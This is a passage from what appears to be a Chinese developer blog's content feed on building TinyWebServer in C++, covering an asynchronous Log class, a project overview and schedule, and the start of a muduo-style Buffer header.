class="headerlink" title="LOG_CPP"></a>LOG_CPP</h4><ul><li>这里使用了移动操作来提高效率</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">std::unique_ptr&lt;BlockDeque&lt;std::string&gt;&gt;<span class="built_in">newDequeue</span>(<span class="keyword">new</span> BlockDeque&lt;std::string&gt;);</span><br><span class="line">deque_ = <span class="built_in">move</span>(newDequeue);<span class="comment">//move避免不必要的对象复制</span></span><br><span class="line"><span class="function">std::unique_ptr&lt;std::thread&gt; <span class="title">newThread</span><span class="params">(<span class="keyword">new</span> std::thread(FlushLogThread))</span></span>;<span class="comment">// 创建一个新的线程对象并使用函数 FlushLogThread 初始化它。</span></span><br><span class="line">writeThread_ = <span class="built_in">move</span>(newThread);  <span class="comment">//move避免不必要的对象复制</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//下面是错误的，原来的资源并未释放</span></span><br><span class="line"><span class="comment">//std::unique_ptr&lt;BlockDeque&lt;std::string&gt;&gt; deque_(new BlockDeque&lt;std::string&gt;);</span></span><br><span class="line"><span class="comment">//std::unique_ptr&lt;std::thread&gt; writeThread_(new std::thread(FlushLogThread));     </span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;log.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Log::init</span><span class="params">(<span class="type">int</span> level, <span class="type">const</span> <span class="type">char</span> *path, <span class="type">const</span> <span class="type">char</span> *suffix,</span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="type">int</span> maxQueueCapacity)</span> </span>&#123;</span><br><span class="line">  isOpen_ = <span class="literal">true</span>;</span><br><span class="line">  level_ = level;</span><br><span class="line">  <span class="comment">//处理是同步日志还是异步日志</span></span><br><span class="line">  <span class="keyword">if</span> (maxQueueCapacity &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    isAsync_ = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (!deque_) &#123;</span><br><span class="line">      std::unique_ptr&lt;BlockDeque&lt;std::string&gt;&gt; <span class="built_in">newDequeue</span>(</span><br><span class="line">          <span class="keyword">new</span> BlockDeque&lt;std::string&gt;);</span><br><span class="line">      deque_ = <span class="built_in">move</span>(newDequeue);</span><br><span class="line">      <span class="function">std::unique_ptr&lt;std::thread&gt; <span class="title">newThread</span><span class="params">(<span class="keyword">new</span> std::thread(FlushLogThread))</span></span>;</span><br><span class="line">      writeThread_ = <span class="built_in">move</span>(newThread);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    isAsync_ = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  lineCount_ = <span class="number">0</span>;</span><br><span class="line">  <span class="type">time_t</span> timer = std::<span class="built_in">time</span>(<span class="literal">nullptr</span>);</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">tm</span> *sysTime = <span class="built_in">localtime</span>(&amp;timer);</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">tm</span> t = *sysTime;</span><br><span class="line">  path_ = path;</span><br><span class="line">  suffix_ = suffix;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> fileName[LOG_NAME_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="built_in">snprintf</span>(fileName, LOG_NAME_LEN, <span class="string">&quot;%s/%04d_%02d_%02d%s&quot;</span>, path_,</span><br><span class="line">           t.tm_year + <span class="number">1900</span>, t.tm_mon + <span class="number">1</span>, t.tm_mday, suffix_);</span><br><span class="line">  toDay_ = t.tm_mday;</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">    buff_.<span class="built_in">RetrieveAll</span>(); <span class="comment">//清空缓冲区</span></span><br><span class="line">    <span class="keyword">if</span> (fp_)             <span class="comment">//关闭上次未关闭的文件描述符</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">flush</span>();</span><br><span class="line">      <span class="built_in">fclose</span>(fp_);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fp_ = <span class="built_in">fopen</span>(fileName, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp_ == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">      <span class="built_in">mkdir</span>(path_, <span class="number">0777</span>);</span><br><span class="line">      fp_ = <span class="built_in">fopen</span>(fileName, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert</span>(fp_ != <span class="literal">nullptr</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">Log *<span class="title">Log::Instance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">static</span> Log inst;</span><br><span class="line">  <span class="keyword">return</span> &amp;inst;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Log::FlushLogThread</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">//切换为同步模式写完日志</span></span><br><span class="line">  Log::<span class="built_in">Instance</span>()-&gt;<span class="built_in">AsyncWrite_</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Log::write</span><span class="params">(<span class="type">int</span> level, <span class="type">const</span> <span class="type">char</span> *format, ...)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">timeval</span> now = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">  <span class="comment">//通过将 now 初始化为 &#123;0, 0&#125;，表示当前时间被设置为 Epoch（1970-01-01 00:00:00</span></span><br><span class="line">  <span class="comment">//UTC）。</span></span><br><span class="line">  <span class="built_in">gettimeofday</span>(&amp;now, <span class="literal">nullptr</span>);</span><br><span class="line">  <span class="type">time_t</span> tSec = now.tv_sec;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">tm</span> *systime = <span class="built_in">localtime</span>(&amp;tSec);</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">tm</span> t = *systime;</span><br><span class="line"></span><br><span class="line">  va_list vaList;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//若日志日期或日志长度超过，我们需要重建文件</span></span><br><span class="line">  <span class="keyword">if</span> (toDay_ != t.tm_mday || (lineCount_ &amp;&amp; (lineCount_ % MAX_LINES == <span class="number">0</span>))) &#123;</span><br><span class="line">    <span class="function">std::unique_lock&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">    locker.<span class="built_in">unlock</span>();</span><br><span class="line">    <span class="type">char</span> newfileName[LOG_NAME_LEN];</span><br><span class="line">    <span class="type">char</span> tail[<span class="number">36</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">snprintf</span>(tail, <span class="number">36</span>, <span class="string">&quot;%04d_%02d_%02d&quot;</span>, t.tm_year + <span class="number">1900</span>, t.tm_mon + <span class="number">1</span>,</span><br><span class="line">             t.tm_mday);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (toDay_ != t.tm_mday) &#123;</span><br><span class="line">      <span class="built_in">snprintf</span>(newfileName, LOG_NAME_LEN - <span class="number">72</span>, <span class="string">&quot;%s/%s%s&quot;</span>, path_, tail, suffix_);</span><br><span class="line">      toDay_ = t.tm_mday;</span><br><span class="line">      lineCount_ = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">snprintf</span>(newfileName, LOG_NAME_LEN - <span class="number">72</span>, <span class="string">&quot;%s/%s-%d%s&quot;</span>, path_, tail,</span><br><span class="line">               (lineCount_ / MAX_LINES), suffix_);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    locker.<span class="built_in">lock</span>();</span><br><span class="line">    <span class="built_in">flush</span>();</span><br><span class="line">    <span class="built_in">fclose</span>(fp_);</span><br><span class="line">    fp_ = <span class="built_in">fopen</span>(newfileName, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">    <span class="built_in">assert</span>(fp_ != <span class="literal">nullptr</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function">std::unique_lock&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">    lineCount_++;</span><br><span class="line">    <span class="type">int</span> n =</span><br><span class="line">        <span class="built_in">snprintf</span>(buff_.<span class="built_in">BeginWrite</span>(), <span class="number">128</span>, <span class="string">&quot;%d-%02d-%02d %02d:%02d:%02d.%06ld&quot;</span>,</span><br><span class="line">                 t.tm_year + <span class="number">1900</span>, t.tm_mon + <span class="number">1</span>, t.tm_mday, t.tm_hour, t.tm_min,</span><br><span class="line">                 t.tm_sec, now.tv_usec);</span><br><span class="line">    buff_.<span class="built_in">HasWritten</span>(n);</span><br><span class="line">    <span class="built_in">AppendLogLevelTitle_</span>(level_);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">va_start</span>(vaList, format);</span><br><span class="line">    <span class="type">int</span> m =</span><br><span class="line">        <span class="built_in">vsnprintf</span>(buff_.<span class="built_in">BeginWrite</span>(), buff_.<span class="built_in">WritableBytes</span>(), format, vaList);</span><br><span class="line">    <span class="built_in">va_end</span>(vaList);</span><br><span class="line">    buff_.<span class="built_in">HasWritten</span>(m);</span><br><span class="line">    buff_.<span class="built_in">Append</span>(<span class="string">&quot;\n\0&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (isAsync_ &amp;&amp; deque_ &amp;&amp; !deque_-&gt;<span class="built_in">full</span>()) &#123;</span><br><span class="line">      deque_-&gt;<span class="built_in">push_back</span>(buff_.<span class="built_in">RetrieveAllToStr</span>());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="built_in">fputs</span>(buff_.<span class="built_in">Peek</span>(), fp_); </span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    buff_.<span class="built_in">RetrieveAll</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// TODO这里频繁开关文件的原因</span></span><br><span class="line">  <span class="comment">//及时更新日志，防止webserver意外终止时日志丢失</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Log::flush</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (isAsync_) &#123;</span><br><span class="line">    deque_-&gt;<span class="built_in">flush</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fflush</span>(fp_); <span class="comment">//清空流</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Log::GetLevel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="function">std::unique_lock&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">  <span class="keyword">return</span> level_;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Log::SetLevel</span><span class="params">(<span class="type">int</span> level)</span> </span>&#123;</span><br><span class="line">  <span class="function">std::unique_lock&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">  level_ = level;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// bool IsOpen() &#123; return isOpen_; &#125;</span></span><br><span class="line"></span><br><span class="line">Log::<span class="built_in">Log</span>() &#123;</span><br><span class="line">  lineCount_ = <span class="number">0</span>;</span><br><span class="line">  toDay_ = <span class="number">0</span>;</span><br><span class="line">  isAsync_ = <span class="literal">false</span>;</span><br><span class="line">  fp_ = <span class="literal">nullptr</span>;</span><br><span class="line">  deque_ = <span class="literal">nullptr</span>;</span><br><span class="line">  writeThread_ = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Log::AppendLogLevelTitle_</span><span class="params">(<span class="type">int</span> level)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (level) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">    buff_.<span class="built_in">Append</span>(<span class="string">&quot;[debug]: &quot;</span>, <span class="number">9</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    buff_.<span class="built_in">Append</span>(<span class="string">&quot;[info] : &quot;</span>, <span class="number">9</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    buff_.<span class="built_in">Append</span>(<span class="string">&quot;[warn] : &quot;</span>, <span class="number">9</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    buff_.<span class="built_in">Append</span>(<span class="string">&quot;[error]: &quot;</span>, <span class="number">9</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    buff_.<span class="built_in">Append</span>(<span class="string">&quot;[info] : &quot;</span>, <span class="number">9</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Log::~<span class="built_in">Log</span>() &#123;</span><br><span class="line">  <span class="keyword">if</span> (writeThread_ &amp;&amp; writeThread_-&gt;<span class="built_in">joinable</span>()) &#123;</span><br><span class="line">    <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">    <span class="keyword">while</span> (!deque_-&gt;<span class="built_in">empty</span>()) &#123;</span><br><span class="line">      deque_-&gt;<span class="built_in">flush</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    deque_-&gt;<span class="built_in">Close</span>();</span><br><span class="line">    writeThread_-&gt;<span class="built_in">join</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp_) &#123;</span><br><span class="line">    <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">    <span class="built_in">flush</span>();</span><br><span class="line">    <span class="built_in">fclose</span>(fp_);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Log::AsyncWrite_</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::string str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">while</span> (deque_-&gt;<span class="built_in">pop</span>(str)) &#123;</span><br><span class="line">    <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">    <span class="built_in">fputs</span>(str.<span class="built_in">c_str</span>(), fp_);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
          <category> TinyWebServer </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> TinyWebServer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TinyWebServer概述</title>
      <link href="/2024/05/02/TinyWebServer/0x1%E6%A6%82%E8%BF%B0/"/>
      <url>/2024/05/02/TinyWebServer/0x1%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="TinyWebServer"><a href="#TinyWebServer" class="headerlink" title="TinyWebServer"></a>TinyWebServer</h1><p>趁着刚看完effectiveCpp，赶紧过来写个小项目，<code>TinyWebServer</code>作为众多Cpp后端开发者的项目，值得入门学习(PS:虽然现在cpp后端已经很少了)。但是我们仍然可以从该项目中学到c++项目体系结构，其中log类、连接池、缓冲区也是与其他cpp项目也有共通之处，当然网络编程的知识也是可以从中学到许多。</p><p>由于我电脑配置有点较低(主要是轻薄本内存不太够)，而且这里我使用的是<code>wsl2+vscode</code>的组合，ps：听说大厂都是远程开发。</p><p>开始时间2024/5/1，预计完成时间2024/5/14。</p><ul><li>2024/5/1 ~ 2024/5/2 完成Buffer</li><li>2024/5/3 ~ 2024/5/4 完成log</li><li>2024/5/4 ~ 2024/5/5 完成pool</li><li>2024/5/5 完成heap</li><li>2024/5/6 ~ 2024/5/10 完成 http</li><li>2024/5/12 ~ 2024/5/12 完成 webserver</li><li>2024/5/13 ~ 2024/5/14 完成总结</li></ul><h4 id="经验教训"><a href="#经验教训" class="headerlink" title="经验教训"></a>经验教训</h4><ul><li>在完成项目时要先从下而上，从上而下完整看完项目。</li><li>灵活使用git功能，实现版本控制。</li><li>对于<code>folk</code>的项目，可以采用逐个替换文件的方法来快速验证正确性。</li></ul><p>//TODO    中文用户插入    时间轮</p>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
          <category> TinyWebServer </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> TinyWebServer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TinyWebServer Buffer</title>
      <link href="/2024/05/02/TinyWebServer/0x2Buffer/"/>
      <url>/2024/05/02/TinyWebServer/0x2Buffer/</url>
      
        <content type="html"><![CDATA[<h1 id="Buffer"><a href="#Buffer" class="headerlink" title="Buffer"></a>Buffer</h1><p>这里的Buffer类是参考陈硕大佬的<code>Linux多线程服务端编程</code>。</p><p>首先，我们为什么要设计buffer:</p><ol><li><code>减少系统调用</code>，频繁从用户态切换到内核态，会浪费大量的cpu时间。</li><li><code>流量控制</code>，使得网络通信的速度和处理速度之间能够更好地匹配。</li><li><code>数据完整性</code>在网络传输中，数据可能会分多次到达。缓冲区可以将这些分片的数据收集完整，然后再通知应用程序处理完整的数据。</li></ol><p>那么，我们要尽可能的在一次系统调用中读取最多的数据，减少<code>系统调用</code>。同时，我们还需要考虑内存问题，让<code>buffer缓冲区</code>又不至于占用过多内存。</p><p>由于调用Buffer的用户是线程安全或只有一个线程对Buffer进行操作，且buffer内的操作不会产生竞态。也就是说我们的Buffer<code>不是线程安全的</code>，线程安全性的责任被传递给了<code>调用者</code>。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240502142300978.png" alt="关键图片，Buffer的构造"></p><p>在<code>muduo</code>库里，由<code>buffer</code>和<code>extrabuffer</code>组成接收数据的缓冲区，其中<code>extrabuffer</code>是局部变量，用于存储额外的数据，尽可能读取更多数据。当<code>extrabuffer</code>有数据时，我们把他<code>append</code>到vector里。</p><p>muduo库buffer的快速了解，建议认真阅读<a href="https://blog.csdn.net/wanggao_1990/article/details/119426351">muduo学习笔记：net部分之实现TCP网络编程库-Buffer_muduo::net::buffer-CSDN博客</a> </p><h3 id="buffer-h"><a href="#buffer-h" class="headerlink" title="buffer.h"></a>buffer.h</h3><p>为了锻炼自己的编程能力,我们作为<code>cv</code>工程师就直接先来写.h头文件，再自己实现.cpp文件。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BUFFER_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">//#include&lt;string&gt;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span>   <span class="comment">//perror</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/uio.h&gt;</span>   <span class="comment">//iovec</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Buffer</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Buffer</span>(<span class="type">int</span> InitBufferSize = <span class="number">1024</span>);</span><br><span class="line">    ~<span class="built_in">Buffer</span>() = <span class="keyword">default</span>;</span><br><span class="line">     <span class="comment">//采用下标而不是指针，因为缓冲区重新分配会使vector重新分配内存</span></span><br><span class="line">    <span class="function"><span class="type">size_t</span> <span class="title">WritableBytes</span><span class="params">()</span> <span class="type">const</span></span>;      </span><br><span class="line">    <span class="function"><span class="type">size_t</span> <span class="title">ReadableBytes</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">    <span class="function"><span class="type">size_t</span> <span class="title">PrependableBytes</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">const</span> <span class="type">char</span>* <span class="title">Peek</span><span class="params">()</span> <span class="type">const</span></span>;   <span class="comment">//返回可读的实际地址</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">EnsureWriteable</span><span class="params">(<span class="type">size_t</span> len)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">HasWritten</span><span class="params">(<span class="type">size_t</span> len)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Retrieve</span><span class="params">(<span class="type">size_t</span> len)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">RetrieveUntil</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* end)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">RetrieveAll</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">std::string <span class="title">RetrieveAllToStr</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//有两个版本</span></span><br><span class="line">    <span class="function"><span class="type">const</span> <span class="type">char</span>* <span class="title">BeginWriteConst</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">    <span class="function"><span class="type">char</span> * <span class="title">BeginWrite</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Append</span><span class="params">(<span class="type">const</span> std::string&amp; str)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Append</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str, <span class="type">size_t</span> len)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Append</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* data, <span class="type">size_t</span> len)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Append</span><span class="params">(<span class="type">const</span> Buffer&amp; buff)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">ssize_t</span> <span class="title">ReadFd</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span>* SaveErrno)</span></span>;     <span class="comment">//从socket读取数据</span></span><br><span class="line">    <span class="function"><span class="type">ssize_t</span> <span class="title">WriteFd</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span>* SaveErrno)</span></span>;    <span class="comment">//写入数据socket</span></span><br><span class="line"></span><br><span class="line"><span 